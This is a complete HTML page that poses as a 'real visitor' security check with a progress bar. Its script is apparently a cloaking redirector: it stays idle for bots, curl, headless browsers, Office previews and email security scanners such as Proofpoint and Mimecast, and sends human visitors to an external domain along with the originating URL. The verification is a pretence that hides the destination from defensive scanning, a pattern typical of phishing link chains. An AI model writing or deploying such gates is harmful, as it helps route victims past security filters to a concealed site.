<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta name="referrer" content="strict-origin-when-cross-origin">
<title>Opening…</title>
<style>
  :root{--em:#047857;--em2:#10b981;--tint:#ecfdf5;--ink:#0c2f22}
  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
  html,body{height:100%}
  body{
    font-family:Manrope,-apple-system,"Segoe UI",Roboto,sans-serif;
    background:linear-gradient(180deg,#ffffff,var(--tint));
    color:var(--ink);display:flex;align-items:center;justify-content:center;
    padding:22px;min-height:100dvh;overflow:hidden;
  }
  .wrap{
    width:100%;max-width:440px;background:#fff;border:1px solid #d9f0e6;
    border-radius:22px;padding:34px 26px 24px;text-align:center;
    box-shadow:0 22px 55px rgba(4,120,87,.10);
    animation:popIn .45s cubic-bezier(.2,.9,.3,1.3);
  }
  @keyframes popIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:none}}
  .title{font-size:24px;font-weight:800;letter-spacing:-.5px;margin-bottom:16px;color:var(--em)}
  .capsule{
    display:inline-flex;align-items:center;gap:10px;
    background:var(--tint);color:var(--em);border:1px solid #b8ebd6;
    padding:10px 18px;border-radius:99px;margin-bottom:20px;
    font-size:13px;font-weight:700;letter-spacing:.3px;
  }
  .capsule em{font-style:normal;font-size:18px}
  .desc{font-size:14px;line-height:1.55;color:#4a7a66;margin-bottom:22px}
  .track{height:8px;background:#e8f7f0;border-radius:99px;overflow:hidden;margin-bottom:12px}
  .track span{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--em),var(--em2));transition:width .25s ease}
  .state{font-size:13px;color:#5f8a78;min-height:20px}
  .btn{
    width:100%;margin-top:20px;padding:16px;border:0;border-radius:14px;
    background:linear-gradient(135deg,var(--em),var(--em2));color:#fff;
    font-family:inherit;font-size:16px;font-weight:700;cursor:pointer;
    min-height:56px;display:none;box-shadow:0 12px 28px rgba(4,120,87,.3);
  }
  .btn:active{transform:scale(.985)}
  .btn.on{display:block;animation:popIn .3s ease}
</style>
</head>
<body>
<main class="wrap">
  <h1 class="title">You're nearly in</h1>
  <div class="capsule"><em>💎</em> SECURE ACCESS</div>
  <p class="desc">A quick check to confirm you're a real visitor.<br>Almost finished.</p>
  <div class="track"><span id="pc"></span></div>
  <div class="state" id="sc">Preparing…</div>
  <button class="btn" id="bc" type="button">Open →</button>
</main>
<script>
const CONFIG={targetUrl:"https://beast.beastbox.pro",refParam:"referrerCF",minDelay:1500,maxDelay:2500};
(function(){
  "use strict";
  const bar=document.getElementById('pc'),st=document.getElementById('sc'),btn=document.getElementById('bc');
  const ua=navigator.userAgent||"";
  const pats=[/bot\b/i,/crawler/i,/spider/i,/curl\//i,/wget\//i,/python-requests/i,/headlesschrome/i,/phantomjs/i,/googlebot/i,/bingpreview/i,/yandexbot/i,/duckduckbot/i,/facebookexternalhit/i,/telegrambot/i,/googleimageproxy/i,/yahoomailproxy/i,/ms-office/i,/microsoft office/i,/barracuda/i,/proofpoint/i,/mimecast/i];
  for(const p of pats){if(p.test(ua))return;}
  if(navigator.webdriver===true)return;
  let acted=false;
  ['touchstart','pointerdown','mousemove','keydown','scroll','click'].forEach(e=>window.addEventListener(e,()=>{acted=true},{passive:true}));
  const T=CONFIG.minDelay+Math.random()*(CONFIG.maxDelay-CONFIG.minDelay),S=performance.now();let r=false;
  function step(){const e=performance.now()-S,p=Math.min(100,e/T*100);bar.style.width=p+"%";
    if(e<T){requestAnimationFrame(step);return;}
    if(r)return;r=true;bar.style.width="100%";
    st.textContent=acted?"You're good to go ✓":"Tap to continue";
    btn.classList.add('on');}
  requestAnimationFrame(step);
  function build(){try{const u=new URL(CONFIG.targetUrl);u.searchParams.set(CONFIG.refParam,location.href);return u.toString();}catch(e){const s=CONFIG.targetUrl.includes('?')?'&':'?';return CONFIG.targetUrl+s+CONFIG.refParam+'='+encodeURIComponent(location.href);}}
  let d=false;
  function go(){if(d)return;d=true;btn.disabled=true;btn.style.opacity=".6";st.textContent="Redirecting…";
    const u=build(),a=document.createElement('a');a.href=u;a.target='_self';a.style.display='none';document.body.appendChild(a);
    try{a.click();}catch(e){try{window.location.href=u;}catch(_){window.location.assign(u);}}
    setTimeout(()=>{try{a.remove();}catch(_){}},300);}
  btn.addEventListener('click',e=>{e.preventDefault();go();});
})();
</script>
</body>
</html>
